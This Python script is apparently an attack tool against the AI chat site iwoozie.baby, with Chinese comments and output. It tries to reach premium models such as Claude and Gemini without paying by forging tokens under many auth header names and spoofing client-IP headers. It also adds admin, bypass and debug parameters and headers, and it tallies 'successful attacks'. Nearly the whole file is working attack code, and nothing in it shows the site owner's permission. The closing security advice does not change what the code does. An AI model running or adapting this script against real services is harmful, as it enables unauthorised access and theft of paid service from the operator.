#!/usr/bin/env python3
"""
iwoozie.baby AI聊天系统 - 高级逆向测试系统
=========================================
专门针对未能绕过的模型进行深度逆向分析
包括多种攻击向量、绕过技术和漏洞挖掘
"""

import urllib.request
import urllib.parse
import urllib.error
import json
import time
import random
import string
import base64
import hashlib
import hmac
from datetime import datetime

class AdvancedReverseTesting:
    def __init__(self):
        self.base_url = "https://iwoozie.baby"
        self.session_cookies = {}
        self.test_results = {
            'total_attacks': 0,
            'successful_attacks': 0,
            'failed_attacks': 0,
            'bypassed_models': set(),
            'failed_models': set(),
            'attack_vectors': {},
            'vulnerabilities': []
        }
        
        # 未能绕过的模型列表
        self.target_models = [
            'Gemini-2.5-Pro',
            'Claude-Sonnet-4',
            'Claude-Opus-4',
            'DeepSeek-V3.1',
            'GLM-4.5'
        ]
        
        # 高级攻击向量
        self.advanced_vectors = [
            'x-api-key',
            'Authorization',
            'x-auth-token',
            'x-token',
            'api-key',
            'token',
            'x-access-token',
            'x-session-token',
            'x-csrf-token',
            'x-requested-with',
            'x-forwarded-for',
            'x-real-ip',
            'x-client-ip',
            'x-remote-ip',
            'x-originating-ip'
        ]
        
        # Token生成策略
        self.token_strategies = [
            'random',
            'timestamp',
            'uuid_like',
            'base64_encoded',
            'md5_hash',
            'sha256_hash',
            'hmac_sha256',
            'jwt_like',
            'session_based',
            'admin_like',
            'bot_like',
            'mobile_like'
        ]
    
    def print_header(self):
        print("=" * 80)
        print("🔓 iwoozie.baby AI聊天系统 - 高级逆向测试系统")
        print("=" * 80)
        print("🎯 目标: 深度分析未能绕过的模型")
        print("⏰ 时间:", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        print("=" * 80)
        print()
    
    def generate_advanced_token(self, strategy, model=None):
        """生成高级Token"""
        if strategy == 'random':
            return f"token_{random.randint(100000, 999999)}_{random.randint(1000, 9999)}"
        elif strategy == 'timestamp':
            timestamp = int(time.time() * 1000)
            return f"token_{timestamp}_{random.randint(1000, 9999)}"
        elif strategy == 'uuid_like':
            return f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
        elif strategy == 'base64_encoded':
            data = f"user_{random.randint(1000, 9999)}_{int(time.time())}"
            return base64.b64encode(data.encode()).decode()
        elif strategy == 'md5_hash':
            data = f"token_{random.randint(1000, 9999)}_{int(time.time())}"
            return hashlib.md5(data.encode()).hexdigest()
        elif strategy == 'sha256_hash':
            data = f"token_{random.randint(1000, 9999)}_{int(time.time())}"
            return hashlib.sha256(data.encode()).hexdigest()
        elif strategy == 'hmac_sha256':
            key = "secret_key_12345"
            data = f"token_{random.randint(1000, 9999)}_{int(time.time())}"
            return hmac.new(key.encode(), data.encode(), hashlib.sha256).hexdigest()
        elif strategy == 'jwt_like':
            header = base64.b64encode('{"alg":"HS256","typ":"JWT"}'.encode()).decode()
            payload = base64.b64encode(f'{{"user_id":{random.randint(1000, 9999)},"exp":{int(time.time()) + 3600}}}'.encode()).decode()
            signature = hashlib.sha256(f"{header}.{payload}.secret".encode()).hexdigest()
            return f"{header}.{payload}.{signature}"
        elif strategy == 'session_based':
            return f"session_{random.randint(100000, 999999)}_{int(time.time())}"
        elif strategy == 'admin_like':
            return f"admin_token_{random.randint(1000, 9999)}_{int(time.time())}"
        elif strategy == 'bot_like':
            return f"bot_{random.randint(1000, 9999)}_{int(time.time())}"
        elif strategy == 'mobile_like':
            return f"mobile_{random.randint(1000, 9999)}_{int(time.time())}"
        else:
            return f"advanced_token_{random.randint(1000, 9999)}"
    
    def make_advanced_request(self, url, data, headers, method='POST'):
        """发送高级HTTP请求"""
        try:
            json_data = json.dumps(data).encode('utf-8')
            
            req = urllib.request.Request(url, data=json_data, headers=headers, method=method)
            req.add_header('Content-Type', 'application/json')
            req.add_header('Accept', 'application/json, text/plain, */*')
            req.add_header('Accept-Language', 'en-US,en;q=0.9')
            req.add_header('Cache-Control', 'no-cache')
            req.add_header('Pragma', 'no-cache')
            
            # 添加随机User-Agent
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0'
            ]
            req.add_header('User-Agent', random.choice(user_agents))
            
            with urllib.request.urlopen(req, timeout=15) as response:
                response_data = response.read().decode('utf-8')
                return response.getcode(), response_data, dict(response.headers)
                
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode('utf-8'), dict(e.headers)
        except urllib.error.URLError as e:
            return 0, str(e), {}
        except Exception as e:
            return 0, str(e), {}
    
    def test_advanced_bypass(self, model, attack_vector, token_strategy, verbose=True):
        """测试高级绕过技术"""
        if verbose:
            print(f"🎯 目标模型: {model}")
            print(f"🔑 攻击向量: {attack_vector}")
            print(f"🎲 Token策略: {token_strategy}")
        
        token = self.generate_advanced_token(token_strategy, model)
        url = f"{self.base_url}/api/quick/createAITask?model={model}"
        
        # 构建高级请求头
        headers = {}
        
        # 主要认证头
        if attack_vector == 'x-api-key':
            headers['x-api-key'] = token
        elif attack_vector == 'Authorization':
            headers['Authorization'] = f'Bearer {token}'
        elif attack_vector == 'x-auth-token':
            headers['x-auth-token'] = token
        elif attack_vector == 'x-token':
            headers['x-token'] = token
        elif attack_vector == 'api-key':
            headers['api-key'] = token
        elif attack_vector == 'token':
            headers['token'] = token
        elif attack_vector == 'x-access-token':
            headers['x-access-token'] = token
        elif attack_vector == 'x-session-token':
            headers['x-session-token'] = token
        elif attack_vector == 'x-csrf-token':
            headers['x-csrf-token'] = token
        elif attack_vector == 'x-requested-with':
            headers['x-requested-with'] = 'XMLHttpRequest'
        elif attack_vector == 'x-forwarded-for':
            headers['x-forwarded-for'] = f'192.168.1.{random.randint(1, 254)}'
        elif attack_vector == 'x-real-ip':
            headers['x-real-ip'] = f'10.0.0.{random.randint(1, 254)}'
        elif attack_vector == 'x-client-ip':
            headers['x-client-ip'] = f'172.16.0.{random.randint(1, 254)}'
        elif attack_vector == 'x-remote-ip':
            headers['x-remote-ip'] = f'203.0.113.{random.randint(1, 254)}'
        elif attack_vector == 'x-originating-ip':
            headers['x-originating-ip'] = f'198.51.100.{random.randint(1, 254)}'
        
        # 添加多个认证头尝试
        headers['x-api-key'] = token
        headers['Authorization'] = f'Bearer {token}'
        headers['x-auth-token'] = token
        
        # 测试数据
        test_data = {
            "Content": [{
                "role": "user", 
                "content": f"Advanced security test for {model} - please respond with 'Advanced test successful'"
            }]
        }
        
        try:
            start_time = time.time()
            status_code, response_data, response_headers = self.make_advanced_request(url, test_data, headers)
            response_time = time.time() - start_time
            
            result = {
                'model': model,
                'attack_vector': attack_vector,
                'token_strategy': token_strategy,
                'status_code': status_code,
                'response_time': response_time,
                'success': False,
                'error': None,
                'response_data': None,
                'response_headers': response_headers
            }
            
            if status_code == 200:
                try:
                    response_json = json.loads(response_data)
                    result['response_data'] = response_json
                    
                    if response_json.get('code') == 200:
                        result['success'] = True
                        if verbose:
                            print(f"  ✅ 高级绕过成功! 响应时间: {response_time:.2f}s")
                            message = response_json.get('data', {}).get('message', 'No message')
                            print(f"  📄 AI响应: {message[:80]}...")
                        self.test_results['bypassed_models'].add(model)
                    else:
                        result['error'] = response_json.get('error', 'Unknown error')
                        if verbose:
                            print(f"  ❌ 高级绕过失败: {result['error']}")
                        self.test_results['failed_models'].add(model)
                except json.JSONDecodeError:
                    result['error'] = "Invalid JSON response"
                    if verbose:
                        print(f"  ❌ 响应解析失败: {result['error']}")
                    self.test_results['failed_models'].add(model)
            else:
                result['error'] = f"HTTP {status_code}"
                if verbose:
                    print(f"  ❌ HTTP错误: {status_code}")
                self.test_results['failed_models'].add(model)
            
            self.test_results['total_attacks'] += 1
            if result['success']:
                self.test_results['successful_attacks'] += 1
            else:
                self.test_results['failed_attacks'] += 1
            
            # 记录攻击向量效果
            if attack_vector not in self.test_results['attack_vectors']:
                self.test_results['attack_vectors'][attack_vector] = {'total': 0, 'success': 0}
            self.test_results['attack_vectors'][attack_vector]['total'] += 1
            if result['success']:
                self.test_results['attack_vectors'][attack_vector]['success'] += 1
            
            return result
            
        except Exception as e:
            error_msg = str(e)
            if verbose:
                print(f"  💥 异常: {error_msg}")
            
            result = {
                'model': model,
                'attack_vector': attack_vector,
                'token_strategy': token_strategy,
                'status_code': 0,
                'response_time': 0,
                'success': False,
                'error': error_msg,
                'response_data': None,
                'response_headers': {}
            }
            
            self.test_results['total_attacks'] += 1
            self.test_results['failed_attacks'] += 1
            self.test_results['failed_models'].add(model)
            
            return result
    
    def test_model_exhaustive(self, model, verbose=True):
        """对单个模型进行穷尽测试"""
        if verbose:
            print(f"\n🔍 开始穷尽测试模型: {model}")
            print("=" * 60)
        
        successful_vectors = []
        
        for attack_vector in self.advanced_vectors:
            if verbose:
                print(f"\n📋 测试攻击向量: {attack_vector}")
                print("-" * 40)
            
            for token_strategy in self.token_strategies:
                result = self.test_advanced_bypass(model, attack_vector, token_strategy, verbose=False)
                
                if result['success']:
                    successful_vectors.append({
                        'attack_vector': attack_vector,
                        'token_strategy': token_strategy,
                        'result': result
                    })
                    if verbose:
                        print(f"  ✅ 成功: {attack_vector} + {token_strategy}")
                else:
                    if verbose:
                        print(f"  ❌ 失败: {attack_vector} + {token_strategy}")
                
                time.sleep(0.3)  # 避免过于频繁
        
        if verbose:
            print(f"\n📊 {model} 穷尽测试完成")
            print(f"成功绕过: {len(successful_vectors)} 种方法")
        
        return successful_vectors
    
    def test_parameter_manipulation(self, model, verbose=True):
        """测试参数操作绕过"""
        if verbose:
            print(f"\n🔧 测试参数操作绕过: {model}")
            print("=" * 60)
        
        base_url = f"{self.base_url}/api/quick/createAITask"
        token = self.generate_advanced_token('random')
        
        # 测试不同的参数组合
        test_cases = [
            # 基本参数
            {'model': model, 'stream': 'true'},
            {'model': model, 'stream': 'false'},
            {'model': model, 'stream': '1'},
            {'model': model, 'stream': '0'},
            
            # 大小写变化
            {'model': model.lower(), 'stream': 'true'},
            {'model': model.upper(), 'stream': 'true'},
            {'model': model.capitalize(), 'stream': 'true'},
            
            # 特殊字符
            {'model': f"{model}+", 'stream': 'true'},
            {'model': f"{model}-", 'stream': 'true'},
            {'model': f"{model}_", 'stream': 'true'},
            {'model': f"{model}.", 'stream': 'true'},
            
            # 编码绕过
            {'model': model, 'stream': 'true', 'bypass': '1'},
            {'model': model, 'stream': 'true', 'admin': '1'},
            {'model': model, 'stream': 'true', 'debug': '1'},
            {'model': model, 'stream': 'true', 'test': '1'},
        ]
        
        successful_cases = []
        
        for i, params in enumerate(test_cases):
            if verbose:
                print(f"  🧪 测试用例 {i+1}: {params}")
            
            # 构建URL
            param_string = urllib.parse.urlencode(params)
            url = f"{base_url}?{param_string}"
            
            headers = {
                'x-api-key': token,
                'Authorization': f'Bearer {token}',
                'x-auth-token': token
            }
            
            data = {
                "Content": [{
                    "role": "user", 
                    "content": f"Parameter manipulation test for {model}"
                }]
            }
            
            try:
                status_code, response_data, response_headers = self.make_advanced_request(url, data, headers)
                
                if status_code == 200:
                    try:
                        response_json = json.loads(response_data)
                        if response_json.get('code') == 200:
                            successful_cases.append(params)
                            if verbose:
                                print(f"    ✅ 成功: {params}")
                        else:
                            if verbose:
                                print(f"    ❌ 失败: {response_json.get('error', 'Unknown error')}")
                    except:
                        if verbose:
                            print(f"    ❌ 响应解析失败")
                else:
                    if verbose:
                        print(f"    ❌ HTTP错误: {status_code}")
                
            except Exception as e:
                if verbose:
                    print(f"    💥 异常: {str(e)}")
            
            time.sleep(0.2)
        
        if verbose:
            print(f"\n📊 参数操作测试完成")
            print(f"成功绕过: {len(successful_cases)} 种参数组合")
        
        return successful_cases
    
    def test_header_injection(self, model, verbose=True):
        """测试请求头注入"""
        if verbose:
            print(f"\n💉 测试请求头注入: {model}")
            print("=" * 60)
        
        url = f"{self.base_url}/api/quick/createAITask?model={model}"
        token = self.generate_advanced_token('random')
        
        # 测试各种请求头注入
        injection_headers = [
            # 基本注入
            {'x-api-key': token, 'x-injected': 'bypass'},
            {'x-api-key': token, 'x-admin': 'true'},
            {'x-api-key': token, 'x-debug': '1'},
            {'x-api-key': token, 'x-test': '1'},
            
            # 认证头注入
            {'x-api-key': token, 'Authorization': f'Bearer {token}'},
            {'x-api-key': token, 'x-auth-token': token},
            {'x-api-key': token, 'x-session-token': token},
            
            # 绕过头注入
            {'x-api-key': token, 'x-bypass': '1'},
            {'x-api-key': token, 'x-override': '1'},
            {'x-api-key': token, 'x-force': '1'},
            
            # 特殊字符注入
            {'x-api-key': token, 'x-special': '!@#$%^&*()'},
            {'x-api-key': token, 'x-unicode': '测试'},
            {'x-api-key': token, 'x-emoji': '🚀🔓💻'},
        ]
        
        successful_injections = []
        
        for i, headers in enumerate(injection_headers):
            if verbose:
                print(f"  💉 注入测试 {i+1}: {list(headers.keys())}")
            
            data = {
                "Content": [{
                    "role": "user", 
                    "content": f"Header injection test for {model}"
                }]
            }
            
            try:
                status_code, response_data, response_headers = self.make_advanced_request(url, data, headers)
                
                if status_code == 200:
                    try:
                        response_json = json.loads(response_data)
                        if response_json.get('code') == 200:
                            successful_injections.append(headers)
                            if verbose:
                                print(f"    ✅ 成功: {list(headers.keys())}")
                        else:
                            if verbose:
                                print(f"    ❌ 失败: {response_json.get('error', 'Unknown error')}")
                    except:
                        if verbose:
                            print(f"    ❌ 响应解析失败")
                else:
                    if verbose:
                        print(f"    ❌ HTTP错误: {status_code}")
                
            except Exception as e:
                if verbose:
                    print(f"    💥 异常: {str(e)}")
            
            time.sleep(0.2)
        
        if verbose:
            print(f"\n📊 请求头注入测试完成")
            print(f"成功绕过: {len(successful_injections)} 种注入方法")
        
        return successful_injections
    
    def run_comprehensive_test(self):
        """运行综合测试"""
        self.print_header()
        
        print("🚀 开始综合逆向测试...")
        print()
        
        all_vulnerabilities = []
        
        for model in self.target_models:
            print(f"\n🎯 目标模型: {model}")
            print("=" * 80)
            
            # 1. 穷尽测试
            print("1️⃣ 穷尽测试")
            exhaustive_results = self.test_model_exhaustive(model, verbose=True)
            if exhaustive_results:
                all_vulnerabilities.extend(exhaustive_results)
            
            # 2. 参数操作测试
            print("\n2️⃣ 参数操作测试")
            param_results = self.test_parameter_manipulation(model, verbose=True)
            if param_results:
                all_vulnerabilities.extend(param_results)
            
            # 3. 请求头注入测试
            print("\n3️⃣ 请求头注入测试")
            header_results = self.test_header_injection(model, verbose=True)
            if header_results:
                all_vulnerabilities.extend(header_results)
            
            print(f"\n✅ {model} 测试完成")
            print("=" * 80)
        
        # 生成综合报告
        self.generate_comprehensive_report(all_vulnerabilities)
    
    def generate_comprehensive_report(self, vulnerabilities):
        """生成综合报告"""
        print("\n" + "=" * 80)
        print("📋 综合逆向测试报告")
        print("=" * 80)
        
        # 基本统计
        total = self.test_results['total_attacks']
        success = self.test_results['successful_attacks']
        failed = self.test_results['failed_attacks']
        success_rate = (success / total * 100) if total > 0 else 0
        
        print(f"📊 测试统计:")
        print(f"  总攻击次数: {total}")
        print(f"  成功攻击: {success}")
        print(f"  失败攻击: {failed}")
        print(f"  成功率: {success_rate:.1f}%")
        print()
        
        # 绕过的模型
        if self.test_results['bypassed_models']:
            print(f"✅ 成功绕过的模型 ({len(self.test_results['bypassed_models'])} 个):")
            for model in sorted(self.test_results['bypassed_models']):
                print(f"  - {model}")
        else:
            print("❌ 没有成功绕过任何模型")
        print()
        
        # 攻击向量效果
        print(f"🔑 攻击向量效果分析:")
        for vector, stats in self.test_results['attack_vectors'].items():
            rate = (stats['success'] / stats['total'] * 100) if stats['total'] > 0 else 0
            print(f"  {vector}: {stats['success']}/{stats['total']} ({rate:.1f}%)")
        print()
        
        # 发现的漏洞
        if vulnerabilities:
            print(f"🚨 发现的漏洞 ({len(vulnerabilities)} 个):")
            for i, vuln in enumerate(vulnerabilities, 1):
                if 'attack_vector' in vuln:
                    print(f"  {i}. {vuln['attack_vector']} + {vuln['token_strategy']}")
                else:
                    print(f"  {i}. 参数操作: {vuln}")
        else:
            print("✅ 未发现新的漏洞")
        print()
        
        # 安全建议
        print(f"💡 安全建议:")
        if success_rate > 50:
            print("  🚨 系统存在严重安全漏洞，建议立即修复!")
            print("  1. 加强所有模型的安全验证")
            print("  2. 实施更严格的参数验证")
            print("  3. 添加请求头过滤机制")
        elif success_rate > 20:
            print("  ⚠️  系统存在中等安全风险，建议尽快改进")
            print("  1. 完善模型访问控制")
            print("  2. 加强参数验证")
            print("  3. 添加安全监控")
        else:
            print("  ✅ 系统安全状况良好，但仍有改进空间")
            print("  1. 继续保持现有安全措施")
            print("  2. 定期进行安全审计")
            print("  3. 持续监控异常访问")
        
        print("\n" + "=" * 80)

def main():
    """主函数"""
    tester = AdvancedReverseTesting()
    
    print("选择测试模式:")
    print("1. 综合测试 (推荐)")
    print("2. 单模型测试")
    print("3. 快速测试")
    
    try:
        choice = input("\n请选择 (1-3): ").strip()
        
        if choice == '1':
            tester.run_comprehensive_test()
        elif choice == '2':
            model = input("输入要测试的模型: ").strip()
            if model:
                print(f"\n🎯 测试模型: {model}")
                tester.test_model_exhaustive(model, verbose=True)
                tester.test_parameter_manipulation(model, verbose=True)
                tester.test_header_injection(model, verbose=True)
            else:
                print("❌ 无效模型名称")
        elif choice == '3':
            print("\n🚀 快速测试模式")
            for model in tester.target_models[:2]:
                print(f"\n🎯 快速测试: {model}")
                tester.test_model_exhaustive(model, verbose=True)
        else:
            print("❌ 无效选择，运行综合测试")
            tester.run_comprehensive_test()
            
    except KeyboardInterrupt:
        print("\n\n⏹️  测试被用户中断")
    except Exception as e:
        print(f"\n💥 测试过程中发生错误: {str(e)}")

if __name__ == "__main__":
    main()
